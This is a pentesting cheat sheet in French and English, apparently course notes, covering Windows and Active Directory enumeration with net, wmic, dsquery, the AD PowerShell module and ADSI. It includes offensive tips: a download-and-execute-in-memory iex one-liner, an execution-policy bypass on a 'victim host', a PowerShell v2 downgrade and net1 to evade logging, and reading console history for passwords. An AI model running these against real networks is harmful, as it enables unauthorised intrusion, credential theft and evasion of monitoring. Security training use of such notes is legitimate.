#### Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

#### Commandes d'exécution powershell utiles
|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|

* `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
	* With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
* `Get-ChildItem Env: | ft Key,Value`
	* Return environment values such as key paths, users, computer information, etc.
* `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`
	* This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|

## Rétrograder version de Powershell
Hôte peut contenir vieilles versions non surveillés de powershell avec moins de fonctionnalités de sécurité.
```powershell
Get-Host
#version plus récente
powershell.exe -version 2
Get-Host
#version 2
```
Pour vérifier si nos commandes sont journalisées
`Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`
`Applications and Services Logs > Windows PowerShell`

## Sécurité
``` powershell
#cmd
sc query windefend
#powershell
netsh advfirewall show allprofiles
Get-MpComputerStatus
```
## suis-je seul
```
qwinsta
```

## Network Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

## WMI
[WMI documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)
[cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
#### Quick WMI checks
|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|

```powershell
Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'" | Select Caption,Name
```

## Net.exe
Très surveillé. utiliser `net1` au lieu de `net` peut potentiellement éviter détection.
#### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

## Netdom
```cmd
netdom query /domain:inlanefreight.local trust
```

|**Command**|**Description**|
|---|---|
|`trust`| Liste les trusts |
|`dc`| liste les domaines |
|`workstation`| liste les postes |

## Dsquery
Peut permettre de répliquer bloodhound ou Powerview. Existe sur tout hôte ayant `Active Directory Domain Services Role` installé. `C:\Windows\System32\dsquery.dll`. Doit avoir privilèges élevé.
```powershell
dsquery user
dsquery computer
#wildcard search
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
#filtres LDAP
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

`=8192` valeur décimale de bits selon la [doc](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)

|**OID**|**Description**|
|---|---|
|`1.2.840.113556.1.4.803`| Valeur de bit doit correspondre complètement |
|`1.2.840.113556.1.4.804`| Si n'importequel bit correspond |
|`1.2.840.113556.1.4.1941`| Distinguished name? |

## [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

## Microsoft RSAT
Remote Server Administration Tools. Contient divers outils de gestion. Disponible sur Professional et Enterprise.
Peut être utilisé à distance si nous avons des creds et un hôte non lié au domaine mais qui peut contacter le DC.
```powershell-session
Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State
```
```powershell-session
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  –Online
```

## AD Service Interfaces (ADSI)
```powershell
([adsisearcher]"(&(objectClass=Computer))").FindAll()
```

## MMC
```cmd-session
runas /netonly /user:Domain_Name\Domain_USER mmc
```